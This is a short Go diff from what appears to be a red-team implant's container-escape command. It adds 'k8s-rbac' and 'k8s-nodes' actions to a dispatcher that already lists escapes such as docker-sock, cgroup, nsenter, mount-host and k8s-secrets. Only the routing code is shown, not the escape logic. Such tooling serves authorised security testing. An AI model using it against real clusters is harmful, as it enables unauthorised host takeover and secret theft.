@@ -64,8 +64,12 @@ func (c *ContainerEscapeCommand) Execute(task structs.Task) structs.CommandResul
 		output, status = escapeK8sDeploy(args)
 	case "k8s-exec":
 		output, status = escapeK8sExec(args)
+	case "k8s-rbac":
+		output, status = escapeK8sRBAC(args)
+	case "k8s-nodes":
+		output, status = escapeK8sNodes(args)
 	default:
-		output = fmt.Sprintf("Unknown action: %s. Use: check, docker-sock, cgroup, nsenter, mount-host, k8s-enum, k8s-secrets, k8s-deploy, k8s-exec", args.Action)
+		output = fmt.Sprintf("Unknown action: %s. Use: check, docker-sock, cgroup, nsenter, mount-host, k8s-enum, k8s-secrets, k8s-rbac, k8s-nodes, k8s-deploy, k8s-exec", args.Action)
 		status = "error"
 	}
 
